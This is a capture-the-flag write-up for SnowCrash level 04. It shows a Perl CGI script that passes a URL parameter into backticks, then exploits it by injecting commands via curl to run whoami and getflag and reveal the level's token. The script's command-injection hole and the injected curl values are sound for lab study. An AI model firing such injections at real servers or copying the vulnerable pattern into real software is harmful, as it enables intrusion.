## LEVEL 04

---

Let's look at what we have in this level.

```shell
$ level04@SnowCrash:~$ ls -l
total 4
-rwsr-sr-x 1 flag04 level04 152 Mar  5  2016 level04.pl
```

We have a perl file, and this file has flag04 rights so I will try to call `getflag` through this function. First I need to see whats inside this .pl file.

```perl
$ cat level04.pl
#!/usr/bin/perl
# localhost:4747
use CGI qw{param};
print "Content-type: text/html\n\n";
sub x {
  $y = $_[0];
  print `echo $y 2>&1`;
}
x(param("x"));
```

This perl file runs a server on port 4747 and gets the `x` parameter to prints it.

Let's try to curl the server with a parameter called `x`.

```shell
$ curl localhost:4747?x=hi
hi
```

Nice, as we can see the result is just `hi` and not `echo hi 2>&1` so backquote execute the command inside then print the result of this command.

So if I write something in backquote in curl I may be able to execute a command inside the program.

```shell
$ curl localhost:4747?x=\`whoami\`
flag04
$ curl localhost:4747?x=\`/bin/getflag\`
Check flag.Here is your token : ne2searoevaevoem4ov4ar8ap
```

---

*Source :*

*https://unix.stackexchange.com/questions/27428/what-does-backquote-backtick-mean-in-commands*